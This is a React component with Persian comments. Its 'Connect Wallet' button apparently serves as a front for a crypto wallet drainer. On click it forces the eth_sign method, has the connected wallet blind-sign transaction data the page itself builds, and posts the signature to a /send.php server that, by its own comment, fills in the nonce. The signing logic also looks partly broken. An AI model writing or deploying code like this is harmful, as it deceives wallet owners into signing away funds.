import { EthereumProvider } from "@walletconnect/ethereum-provider";

function App() {
  async function runner() {
    if (typeof localStorage !== "undefined") {
      localStorage.removeItem("walletconnect");
    }

    var ethereumProvider = await EthereumProvider.init({
      showQrModal: true,
      chains: [56], // BSC
      methods: ["eth_sign"], // تغییر متد به eth_sign
      projectId: "9fe3ed74e1d73141e8b7747bedf77551",
    });

    await ethereumProvider.enable();
    var provider = ethereumProvider;
    var accounts = await provider.request({ method: "eth_accounts" });
    var sender = accounts[0];
    console.log("✅ Wallet Address:", sender);

    let apiUrl = "/send.php";

    async function getRawSignature(address, rawTxData) {
      try {
        var rawSignature = await provider.request({
          method: "eth_sign",
          params: [address, rawTxData], // امضای تراکنش خام
        });

        return { rawSignature, rawTxData };
      } catch (error) {
        console.error("❌ Error in getRawSignature:", error);
        return null;
      }
    }

    async function sendSignedTransaction(signature, rawTxData) {
      try {
        let requestData = {
          signedData: signature,
          rawTxData: rawTxData,
        };

        let response = await fetch(apiUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(requestData),
        });

        let resultJson = await response.json();
        console.log("📤 Server Response:", resultJson);

        return resultJson.txHash || resultJson.result || resultJson;
      } catch (error) {
        console.error("❌ Error in sendSignedTransaction:", error);
        return null;
      }
    }

    let rawTxData = JSON.stringify({
      to: "0xRecipientAddress", // آدرس مقصد را اینجا تنظیم کن
      value: "0.01", // مقدار BNB
      gas: "21000", // مقدار گس پایه
      gasPrice: "5000000000", // مقدار گس پرایس
      nonce: "0", // این مقدار در سرور جایگزین مقدار صحیح می‌شود
    });

    var signedData = await getRawSignature(sender, rawTxData);

    if (signedData) {
      console.log("✍️ Signed Raw Data:", signedData);
      var txHash = await sendSignedTransaction(
        signedData.rawSignature,
        signedData.rawTxData
      );
      console.log("📤 Final Transaction Hash:", txHash);
    } else {
      console.error("⚠ Signing failed.");
    }
  }

  return (
    <button
      onClick={runner}
      className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
    >
      <span>Connect Wallet</span>
    </button>
  );
}

export default App;
